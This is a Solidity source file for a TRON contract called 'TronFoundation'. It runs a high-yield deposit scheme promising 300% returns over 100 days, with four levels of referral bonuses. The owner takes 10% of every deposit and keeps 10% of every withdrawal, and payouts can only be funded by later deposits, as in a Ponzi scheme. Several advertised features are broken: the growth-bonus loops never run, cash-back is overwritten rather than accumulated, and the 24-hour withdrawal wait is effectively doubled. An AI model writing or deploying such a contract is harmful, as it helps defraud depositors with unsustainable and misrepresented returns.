//SourceUnit: contract.sol

pragma solidity 0.5.9;

contract TronFoundation {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 last_withdrawal;
        uint256 total_referral_bonus;
        uint256 growth_bonus;
        uint256 cash_back;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable owner;

    uint8 investment_days;
    uint256 investment_perc;
    uint256 donation_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint8[] referral_bonuses;

    uint256 private _to;

    mapping(address => Player) public players;
    address[] all_players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    uint256[] growth_limit = [10,9,8,7,6,5,4,3,2,1];

    constructor() public {
        owner = msg.sender;

        donation_perc = 10;
        _to = 24 hours;

        investment_days = 100;
        investment_perc = 300;

        referral_bonuses.push(5);
        referral_bonuses.push(5);
        referral_bonuses.push(5);
        referral_bonuses.push(5);


    }

    function deposit(address _referral) external payable {
        require(msg.value >= 5e7, "Zero amount");
        require(msg.value >= 50000000, "Minimal deposit: 50 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1500, "Max 1500 deposits per address");

        _updateGrowth();

       if(player.deposits.length == 0){
            player.last_withdrawal = uint256(block.timestamp) + _to;
        }

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
            all_players.push(msg.sender);
        }

        player.total_invested += msg.value;

        cashBack(msg.sender,msg.value);

        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value.mul(20).div(100));

        owner.transfer(msg.value.mul(10).div(100));



        emit Deposit(msg.sender, msg.value);
    }

    function cashBack(address player,uint256 _amount) private{
        if(_amount >= (10000 * 1000000)){
            players[player].cash_back = _amount.mul(10).div(100);
        }else {
            players[player].cash_back = _amount.mul(5).div(100);
        }

    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
         address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount.mul(referral_bonuses[i]).div(100);

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        require(uint256(block.timestamp) > player.last_withdrawal + _to,"Countdown still running");

        _payout(msg.sender);
         _updateGrowth();

        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus + player.growth_bonus + player.cash_back;

        player.dividends = 0;
        player.referral_bonus = 0;
        player.growth_bonus = 0;
        player.cash_back = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
        player.last_withdrawal = uint256(block.timestamp) + _to;
        msg.sender.transfer(amount.mul(100 - donation_perc).div(100));

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }


    function growthtOf() view external returns(uint256 value) {
        uint256 contractGrowth = 0;
        uint256 contractBalance = address(this).balance;
        for(uint256 k = 0; k > growth_limit.length; k++){
              if(contractBalance >= (growth_limit[k] * 1e12) ){
                   contractGrowth = growth_limit[k];
                    break;
                }
         }
         return contractGrowth;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals,uint256 _last_withdrawal,uint256 cash_back,uint256 growth) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);


        uint256 growth_percentage = investment_perc.div(investment_days) + this.growthtOf();

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal,
            player.cash_back,
            growth_percentage
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function _updateGrowth() private{
        if(all_players.length > 0){
            uint256 contractBalance = address(this).balance;
            for(uint256 g = 0; g < all_players.length; g++ ){
               address p = all_players[g];
               uint256 payout = this.payoutOf(p);
               if(payout > 0 && contractBalance >= 1e12){
                   Player storage player = players[p];
                   uint256 growth = 0;
                   for(uint256 i = 0; i < player.deposits.length; i++) {
                        PlayerDeposit storage dep = player.deposits[i];
                        uint256 time_end = dep.time + investment_days * 86400;
                        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                        uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
                        if(from < to) {
                            for(uint256 k = 0; k > growth_limit.length; k++){
                                if(contractBalance >= (growth_limit[k] * 1e12) ){
                                    growth += dep.amount.mul(growth_limit[k]).div(100);
                                    break;
                                }
                            }

                        }
                    }
                    player.growth_bonus += growth;
               }
            }
        }
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}